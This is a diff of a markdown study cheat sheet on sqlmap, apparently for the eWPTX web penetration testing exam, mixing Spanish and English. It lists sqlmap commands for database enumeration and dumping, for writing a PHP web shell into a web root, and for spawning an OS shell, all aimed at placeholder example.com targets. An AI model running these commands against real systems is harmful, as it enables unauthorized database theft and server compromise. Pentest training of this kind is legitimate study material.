@@ -36,7 +36,24 @@
 | `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Writing a file                                              |
 | `sqlmap -u "http://www.example.com/?id=1" --os-shell`        | Spawning an OS shell                                        |
 
+
+### SQLMap Payloads Ordenados
+
+1. Comprobar si la herramienta está instalada
+```bash
+which sqlmap
+```
+2. Instalar la herramienta
+```bash
+sudo apt-get update -y && sudo apt install sqlmap
+```
+3. 
+```bash
+sqlmap -u "http://www.example.com/?id=1" --dump -T [TABLE_NAME] -D [DATABASE_NAME]
+```
+
 ### Usefull Commands for eWPTX!
+
 ```bash
 #Seleccionar un target
 sqlmap -u "http://www.target.com/path/file.htm?variable=1"
@@ -74,19 +91,4 @@ sqpmal -D "table"
 
 #Dumpear toda la DB
 sqlmap --dump
-```
-
-### SQLMap Payloads in order to use on a real scenario
-
-1. Basic Enumeration
-```bash
-sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
-```
-2. Table Enumeration
-```bash
-sqlmap -u "http://www.example.com/?id=1" --tables -D [DATABASE_NAME]
-```
-After identifying the name of the table of interest, you can retrieve its content using the --dump option and specifying the name of the table with -T users, like this:
-```bash
-sqlmap -u "http://www.example.com/?id=1" --dump -T [TABLE_NAME] -D [DATABASE_NAME]
 ```
